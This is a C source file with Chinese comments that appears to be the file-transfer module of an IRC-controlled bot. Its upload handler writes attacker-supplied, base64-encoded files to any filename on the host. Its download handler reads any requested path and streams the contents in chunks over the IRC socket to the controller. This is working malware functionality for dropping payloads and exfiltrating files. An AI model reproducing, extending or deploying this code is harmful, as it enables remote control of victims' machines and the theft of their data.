#include "header.h"

BYTE* base64_decode(const char* input, DWORD in_len, DWORD* out_len) {
    DWORD decoded_len = 0;
    if (!CryptStringToBinaryA(input, in_len, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL)) {
        bot_log("[!] Failed to calculate decoded length\n");
        return NULL;
    }

    BYTE* output = (BYTE*)malloc(decoded_len + 1);
    if (!output) {
        bot_log("[!] Memory allocation failed\n");
        return NULL;
    }

    if (CryptStringToBinaryA(input, in_len, CRYPT_STRING_BASE64, output, &decoded_len, NULL, NULL)) {
        *out_len = decoded_len;
        output[decoded_len] = '\0';  // 可选：空终止符
        return output;
    }

    free(output);
    return NULL;
}

char* base64_encode(BYTE* input, DWORD in_len, DWORD* out_len) {
    DWORD encoded_len = 0;

    // 计算需要的缓冲区大小
    if (!CryptBinaryToStringA(input, in_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encoded_len)) {
        bot_log("[!] Failed to calculate encoded length\n");
        return NULL;
    }

    // 分配内存
    char* output = (char*)malloc(encoded_len + 1);
    if (!output) {
        bot_log("[!] Memory allocation failed\n");
        return NULL;
    }

    // 实际进行 Base64 编码
    if (!CryptBinaryToStringA(input, in_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, output, &encoded_len)) {
        bot_log("[!] Base64 encoding failed\n");
        free(output);
        return NULL;
    }

    output[encoded_len] = '\0';  // 添加字符串结束符
    *out_len = encoded_len;
    return output;
}

typedef struct {
    char filename[MAX_PATH];    // 文件名
    long size;                 // 文件大小
    FILE* fp;                   // 文件指针
    char* b64_content;        // Base64 缓存
    long b64_len;              // 当前 Base64 长度
    long b64_capacity;         // Base64 缓存容量
    char expected_hash[65];   // 存储期望的 SHA256 值
} ReceivedFile;

extern ReceivedFile current_file;

ReceivedFile current_file = { 0 };

int handle_file_upload(ParsedCommand cmd) {
    for (int i = 0; i < cmd.num_params; ++i) {
        char* line = cmd.params[i];

        if (strcmp(line, "UPLOADSTART") == 0) {
            // 重置上传状态
            if (current_file.b64_content) {
                free(current_file.b64_content);
            }
            memset(&current_file, 0, sizeof(ReceivedFile));
            bot_log("[+] Upload started\n");
        }

        else if (strncmp(line, "FILENAME:", 9) == 0) {
            strncpy(current_file.filename, line + 9, MAX_PATH - 1);
            current_file.filename[MAX_PATH - 1] = '\0';
            bot_log("[+] Receiving file: %s\n", current_file.filename);
        }

        else if (strncmp(line, "SIZE:", 5) == 0) {
            current_file.size = atol(line + 5);
            current_file.b64_capacity = current_file.size * 2;

            if (current_file.b64_content) {
                free(current_file.b64_content);
            }
            current_file.b64_content = (char*)malloc(current_file.b64_capacity + 1);
            if (!current_file.b64_content) {
                bot_log("[!] Memory allocation failed\n");
                return -1;
            }
            current_file.b64_len = 0;
        }

        else if (strncmp(line, "DATA:", 5) == 0) {
            const char* data = line + 5;
            int data_len = strlen(data);

            if (current_file.b64_len + data_len + 1 >= current_file.b64_capacity) {
                current_file.b64_capacity += 1024;
                char* new_buf = (char*)realloc(current_file.b64_content, current_file.b64_capacity + 1);
                if (!new_buf) {
                    bot_log("[!] Memory reallocation failed\n");
                    return -1;
                }
                current_file.b64_content = new_buf;
            }

            memcpy(current_file.b64_content + current_file.b64_len, data, data_len);
            current_file.b64_len += data_len;
        }

        else if (strncmp(line, "HASH:", 5) == 0) {
            strncpy(current_file.expected_hash, line + 5, 64);
            current_file.expected_hash[64] = '\0';
            bot_log("[+] Expected SHA256: %s\n", current_file.expected_hash);
        }

        else if (strcmp(line, "UPLOADEND") == 0) {
            if (!current_file.b64_content || current_file.b64_len == 0) {
                bot_log("[!] No data received\n");
                return -1;
            }

            // 解码 Base64
            DWORD decoded_len = 0;
            BYTE* decoded = base64_decode(current_file.b64_content, current_file.b64_len, &decoded_len);
            if (decoded && decoded_len > 0) {
                // 计算 SHA256
                char actual_hash[65];
                if (compute_sha256(decoded, decoded_len, actual_hash) != 0) {
                    bot_log("[-] SHA256 calculation failed\n");
                    free(decoded);
                    return -1;
                }

                // 校验
                if (strlen(current_file.expected_hash) == 64 &&
                    memcmp(current_file.expected_hash, actual_hash, 64) == 0) {
                    bot_log("[+] SHA256 verified: %s\n", actual_hash);

                    // 保存文件
                    current_file.fp = fopen(current_file.filename, "wb");
                    if (current_file.fp) {
                        fwrite(decoded, 1, decoded_len, current_file.fp);
                        fclose(current_file.fp);
                        bot_log("[+] File saved: %s (%ld bytes)\n", current_file.filename, decoded_len);
                    }
                    else {
                        bot_log("[!] Failed to open file: %s\n", current_file.filename);
                        return -1;
                    }
                }
                else {
                    bot_log("[-] SHA256 verification failed!\n");
                    bot_log("[-] Expected: %s\n", current_file.expected_hash);
                    bot_log("[-] Actual:   %s\n", actual_hash);
                    return -1;
                }
            }
            else {
                bot_log("[!] Base64 decode failed\n");
                return -1;
            }

            // 清理资源
            free(current_file.b64_content);
            free(decoded);
            current_file.b64_content = NULL;
            current_file.b64_len = 0;
            current_file.size = 0;
            current_file.fp = NULL;
        }
    }

    return 0;
}

long get_file_size(FILE* fp) {
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    rewind(fp);
    return size;
}

int handle_file_download(ParsedCommand cmd) {
    char msg[512];
    char *path = cmd.params[1];
    FILE* fp = fopen(path, "rb");
    if (!fp) {
        bot_log("Failed to open file");
        return -1;
    }

    long file_size = get_file_size(fp);
    char* data = (char*)malloc(file_size+1);
    if (!data) {
        bot_log("malloc fail");
        fclose(fp);
        return -1;
    }

    size_t read = fread(data, 1, file_size, fp);
    if (read != file_size) {
        bot_log("Failed to read entire file\n");
        fclose(fp);
        free(data);
        return -1;
    }

    data[read] = '\0';

    // 计算 SHA-256 哈希
    char hash[65];
    compute_sha256(data, read, hash);

    // Base64 编码
    DWORD encoded_len = 0;
    char* encoded_data = base64_encode((BYTE*)data, read, &encoded_len);
    if (!encoded_data) {
        bot_log("Base64 encode failed\n");
        free(data);
        fclose(fp);
        return -1;
    }

    appendToBuffer(&msgBuffer, ircsock, "upload");
    appendToBuffer(&msgBuffer, ircsock, "UPLOADSTART");
    flushBuffer(&msgBuffer, ircsock);

    const char* filename = strrchr(path, '\\');
    if (!filename) filename = strrchr(path, '/');
    if (!filename) filename = path;
    else filename += 1;

    snprintf(msg, sizeof(msg), "FILENAME:%s", filename);
    appendToBuffer(&msgBuffer, ircsock, "upload");
    appendToBuffer(&msgBuffer, ircsock, msg);
    flushBuffer(&msgBuffer, ircsock);


    snprintf(msg, sizeof(msg), "SIZE:%u", file_size);
    appendToBuffer(&msgBuffer, ircsock, "upload");
    appendToBuffer(&msgBuffer, ircsock, msg);
    flushBuffer(&msgBuffer, ircsock);


#define CHUNK_SIZE 300

    int chunk_size = CHUNK_SIZE; 
    int total_chunks = (encoded_len + chunk_size - 1) / chunk_size;

    for (int i = 0; i < total_chunks; i++) {
        int start = i * chunk_size;
        int end = (start + chunk_size < encoded_len) ? start + chunk_size : encoded_len;

        char chunk[CHUNK_SIZE + 1]; 
        memcpy(chunk, encoded_data + start, end - start);
        chunk[end - start] = '\0';

        snprintf(msg, sizeof(msg), "DATA:%s", chunk);
        appendToBuffer(&msgBuffer, ircsock, "upload");
        appendToBuffer(&msgBuffer, ircsock, msg);
        flushBuffer(&msgBuffer, ircsock);
    }


    snprintf(msg, sizeof(msg), "HASH:%s", hash);
    appendToBuffer(&msgBuffer, ircsock, "upload");
    appendToBuffer(&msgBuffer, ircsock, msg);
    flushBuffer(&msgBuffer, ircsock);

    appendToBuffer(&msgBuffer, ircsock, "upload");
    appendToBuffer(&msgBuffer, ircsock, "UPLOADEND");
    flushBuffer(&msgBuffer, ircsock);


    free(encoded_data);
    free(data);
    fclose(fp);

}

